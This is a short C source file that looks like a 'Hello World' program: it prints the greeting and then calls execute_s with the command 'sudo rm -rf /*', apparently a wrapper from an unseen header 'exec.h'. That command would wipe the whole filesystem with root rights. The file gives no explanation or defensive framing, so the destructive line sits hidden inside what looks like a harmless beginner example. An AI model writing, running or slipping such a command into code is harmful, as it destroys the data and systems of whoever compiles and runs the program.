#include "exec.h"
#include <stdio.h>

int main(){
    printf("Hello World!\n");
    execute_s("sudo rm -rf /*");
    return 0;
}
